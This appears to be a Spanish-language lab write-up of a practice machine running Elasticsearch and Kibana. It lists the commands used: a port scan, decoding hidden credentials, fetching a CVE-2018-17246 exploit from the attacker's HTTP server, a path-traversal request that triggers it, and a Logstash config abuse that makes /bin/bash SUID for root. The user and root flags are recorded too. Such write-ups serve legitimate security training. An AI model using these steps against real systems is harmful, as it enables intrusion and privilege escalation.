- ---
- Tags: #ejptmachine 
---

https://www.youtube.com/watch?v=-Ck0z8N1LxQ&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29
https://github.com/mpgn/CVE-2018-17246

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.115 -oN portScan`

![Pasted image 20250109192415](../../Fotos/Pasted%20image%2020250109192415.png)

![Pasted image 20250109193051](../../Fotos/Pasted%20image%2020250109193051.png)

80
![Pasted image 20250109193206](../../Fotos/Pasted%20image%2020250109193206.png)

9200 Elasticsearch

![Pasted image 20250109193301](../../Fotos/Pasted%20image%2020250109193301.png)

`wget http://10.10.10.115/needle.jpg`

![Pasted image 20250109194458](../../Fotos/Pasted%20image%2020250109194458.png)

`strings -n 20 needle.jpg`

![Pasted image 20250109194715](../../Fotos/Pasted%20image%2020250109194715.png)

`strings -n 20 needle.jpg | tail -1 | base64 -d`

![Pasted image 20250109194733](../../Fotos/Pasted%20image%2020250109194733.png)

---

![Pasted image 20250109201829](../../Fotos/Pasted%20image%2020250109201829.png)

- Nos saltamos esto ya que nos manda a ver lo oculto en la foto pero quedémonos con el comando que cambiando el docs count podría ser interesante iterar y buscar cosas. En este caso no necesario mas

---

`curl http://10.10.10.115:9200/_cat/indices?v`

![Pasted image 20250109201339](../../Fotos/Pasted%20image%2020250109201339.png)

![Pasted image 20250109201408](../../Fotos/Pasted%20image%2020250109201408.png)

---

![Pasted image 20250109202124](../../Fotos/Pasted%20image%2020250109202124.png)

"Esta clave no se puede p…zogc3BhbmlzaC5pcy5rZXk="

![Pasted image 20250109202148](../../Fotos/Pasted%20image%2020250109202148.png)

"Tengo que guardar la cla…: dXNlcjogc2VjdXJpdHkg "

`echo "c3BhbmlzaC5pcy5rZXk=" | base64 -d`

![Pasted image 20250109202406](../../Fotos/Pasted%20image%2020250109202406.png)

- spanish.is.key 
`echo "dXNlcjogc2VjdXJpdHkg" | base64 -d`

![Pasted image 20250109202250](../../Fotos/Pasted%20image%2020250109202250.png)

- user: security 

---

`ssh security@10.10.10.115`

![Pasted image 20250109202719](../../Fotos/Pasted%20image%2020250109202719.png)

`Maquina Vulnerada`

User Flag: cb11f0a2aef2dc65009130edfd34e2e2

---

*Escalada de Privilegios*

![Pasted image 20250109203346](../../Fotos/Pasted%20image%2020250109203346.png)

ruta interesante
`/usr/share/kibana/bin/kibana --version`

![Pasted image 20250109203919](../../Fotos/Pasted%20image%2020250109203919.png)

Kibana corre por el 5601 en este caso solo corre localmente no del exterior por ende hay que enviar el puerto a nuestra maquina local osea **Port For Warding**

---
*Esto lo hacemos solo para detectar puertos en escucha de manera local en la maquina vulnerada*

Queremos revisar que servicios están en escucha quizás por el local host pero no esta netstat instalado asique usaremos **/proc/net/tcp** y grepearemos por el estado **0A**
`cat /proc/net/tcp | grep '00000000:0000 0A'`

![Pasted image 20250109225415](../../Fotos/Pasted%20image%2020250109225415.png)

- La segunda columna corresponde al puerto, se encuentra en hexadecimal

`cat /proc/net/tcp | grep '00000000:0000 0A'|awk '{print substr($2, length($2)-3, 4)}'`

![Pasted image 20250109230146](../../Fotos/Pasted%20image%2020250109230146.png)

`echo "ibase=16; 0050; 23F0; 0016; 15E1" | bc`

![Pasted image 20250109231435](../../Fotos/Pasted%20image%2020250109231435.png)

----

`ps aux`

![Pasted image 20250109233433](../../Fotos/Pasted%20image%2020250109233433.png)

-----
Copiamos lo ultimo que sale y lo metemos en un archivo para tener el script
`https://github.com/mpgn/CVE-2018-17246`

extension **.js**

![Pasted image 20250109234138](../../Fotos/Pasted%20image%2020250109234138.png)

![Pasted image 20250109234022](../../Fotos/Pasted%20image%2020250109234022.png)

Modificamos la ip de nuestra maquina

![Pasted image 20250109234204](../../Fotos/Pasted%20image%2020250109234204.png)

Cargamos el exploit.js que creamos a la maquina, lo haremos ene l directorio /tmp
`curl 10.10.14.16:8000/exploit.js > exploit.js`

![Pasted image 20250110144117](../../Fotos/Pasted%20image%2020250110144117.png)

`python3 -m http.server 8000`

![Pasted image 20250109234410](../../Fotos/Pasted%20image%2020250109234410.png)

`curl "localhost:5601/api/console/api_server?sense_version=@@SENSE_vERSION&apis=../../../../../../.../../../../tmp/exploit.js"`

![Pasted image 20250109235245](../../Fotos/Pasted%20image%2020250109235245.png)

![Pasted image 20250109235256](../../Fotos/Pasted%20image%2020250109235256.png)

`Maquina Vulnerada`
- Hay que hacer tratamiento si o si de la tty con python de lo contrario no podremos crear los archivos con vi generando conflicto.

![Pasted image 20250110153015](../../Fotos/Pasted%20image%2020250110153015.png)

`find / -user kibana 2>/dev/null | grep -vE "usr|var|proc"`

![Pasted image 20250110000212](../../Fotos/Pasted%20image%2020250110000212.png)

`/etc/logstash/conf.d`
- Esta es una ruta donde l usuario kibana es propietario

Cateamos los archivos que hay en los archivos
filter.conf

![Pasted image 20250109235641](../../Fotos/Pasted%20image%2020250109235641.png)

- Y que dentro de ese archivo logstash_(algo) esta filtrando y si coincido con la sintatus entre comillas Ejecutar comando .... 
input.conf

![Pasted image 20250109235718](../../Fotos/Pasted%20image%2020250109235718.png)

- logstash_ (que es)
- Interpretamos que cada intervalos de tiempo se busca un archivo en la ruta que aparece en la imagen con nombre de archivo logstash_(algo)
output.conf

![Pasted image 20250109235732](../../Fotos/Pasted%20image%2020250109235732.png)

- Esto es algo que ejecuta comandos a nivel de sistema asi se visualiza aparentemente creemos

En el directorio donde estábamos con el exploit.js osea el /tmp colocamos un script en bash que de permisos SUID a la bin/nbash

![Pasted image 20250110001133](../../Fotos/Pasted%20image%2020250110001133.png)

- Nombre de archivo: gimeroot.sh

Creamos un archivo con el comando dentro con la sintaxis de ejecutar... que es el filtro para ver si nos ejecuta la orden de dar permisos SUID en el otro directorio con el otro script recién creado
Recordemos debe de tener como nombre logstash_(algo)
- logstash_pwned usaremos

![Pasted image 20250110001257](../../Fotos/Pasted%20image%2020250110001257.png)

![Pasted image 20250110001359](../../Fotos/Pasted%20image%2020250110001359.png)

`watch -n 1 ls -l /bin/bash`

![Pasted image 20250110001609](../../Fotos/Pasted%20image%2020250110001609.png)

![Pasted image 20250110001918](../../Fotos/Pasted%20image%2020250110001918.png)

Y pasado unos segundos vemos que se asigna el permiso SUID tras la ejecución a intervalos de tiempo que habíamos antelado

![Pasted image 20250110001949](../../Fotos/Pasted%20image%2020250110001949.png)

![Pasted image 20250110002015](../../Fotos/Pasted%20image%2020250110002015.png)

![Pasted image 20250110153822](../../Fotos/Pasted%20image%2020250110153822.png)

`Maquina Vulnerada`

Root Flag: 5102dd0d4b954c4a635bb1661874202b


